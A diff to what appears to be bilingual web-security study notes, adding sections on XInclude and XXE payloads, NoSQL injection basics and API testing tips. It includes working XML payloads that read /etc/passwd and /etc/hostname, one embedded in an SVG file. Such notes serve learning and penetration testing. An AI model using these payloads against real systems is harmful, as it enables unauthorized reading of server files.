@@ -613,3 +613,51 @@ XML 支持通过 **DTD**（文档类型定义）定义实体（**entity**），�
 ```
 - `file:///usr/local/app/schema.dtd`
 - `custom_entity`
+
+---
+
+**XInclude attacks**
+
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
+*xxe.svg*
+```xml
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+```
+
+## NoSQL injection
+
+[NoSQL注入](../vuln/SqlInject.md#nosql注入) 是一种针对 NoSQL 数据库（如 MongoDB、Redis、CouchDB 等）的安全攻击手段，与传统 SQL 注入类似，但利用的是 NoSQL 数据库特有的查询语法和结构。
+
+**🔍 基本原理**
+
+攻击者通过操纵应用程序发送给数据库的查询，绕过认证逻辑或获取未授权数据。
+
+
+## API testing
+
+APIs (**Application Programming Interfaces**) enable software systems and applications to communicate and share data. API testing is important as vulnerabilities in APIs may undermine core aspects of a website's confidentiality, integrity, and availability.
+
+<span style="font-size: 19px;">**PoC**</span>
+
+OpenAPI Parser
+JS Link Finder
+Content type converter
+Param Miner
+Backslash Powered Scanne
+
+*Discovering API documentation*
+```bash
+/api
+/swagger/index.html
+/openapi.json
+```
+
+*HTTP修改*
+```bash
+OPTIONS 
+Content-Type: application/json
+Content-Type: application/xml;charset=UTF-8
+```
